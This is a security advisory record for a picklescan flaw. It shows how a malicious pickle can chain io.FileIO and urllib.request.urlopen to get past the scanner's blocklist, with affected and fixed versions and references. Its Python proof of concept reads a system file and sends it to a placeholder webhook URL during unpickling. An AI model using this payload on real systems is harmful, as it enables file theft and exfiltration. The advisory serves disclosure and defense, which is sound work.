advisory_id: GHSA-9726-w42j-3qjr
datasource_id: github_osv_importer_v2/GHSA-9726-w42j-3qjr
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-9726-w42j-3qjr/GHSA-9726-w42j-3qjr.json
aliases: []
summary: |
  picklescan has Arbitrary file read using `io.FileIO`
  ### Summary
  Unsafe pickle deserialization allows unauthenticated attackers to read arbitrary server files and perform SSRF. By chaining io.FileIO and urllib.request.urlopen, an attacker can bypass RCE-focused blocklists to exfiltrate sensitive data (example: /etc/passwd) to an external server.

  ### Details
  The application deserializes untrusted pickle data. While RCE keywords (os, exec) may be blocked, the exploit abuses standard library features:

  1. io.FileIO: Opens local files without using builtins.open.

  2. urllib.request.urlopen: Accepts the file object as an iterable body for a POST request.

  3. Data Exfiltration: The file content is streamed directly to an attacker-controlled URL during unpickling.

  ### PoC

  ```python
  import pickle, io, urllib.request

  class GetFile:
      def __reduce__(self):
          return (io.FileIO, ('/etc/hosts', 'r'))

  class Exfiltrate:
      def __reduce__(self):
          return (urllib.request.urlopen, ('https://webhook.site/YOUR_UUID_HERE', GetFile()))

  with open("bypass_http.pkl", "wb") as f:
      pickle.dump(Exfiltrate(), f)
  ```

  <img width="650" height="114" alt="Screenshot 2025-12-30 at 10 13 14â€¯PM" src="https://github.com/user-attachments/assets/4edf9640-80f6-4701-ae87-cff1079e2994" />


  ### Impact

  - Arbitrary file read

  Thanks for this library and your time. If you think `picklescan` is focused on detecting only `RCE` kind of vulnerabilities rather adding `File IO`, `Http` or any protocol based may cause lot of noise, feel free to close this issue.
impacted_packages:
  - purl: pkg:pypi/picklescan
    affected_versions: vers:pypi/<0.0.35
    fixed_versions: vers:pypi/0.0.35
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.8'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-9726-w42j-3qjr/GHSA-9726-w42j-3qjr.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-918
  - CWE-22
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/a01c58d5dd7960db557b849817c0ab83ab111ef1
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/pull/55
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.35
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9726-w42j-3qjr
    reference_type:
    reference_id:
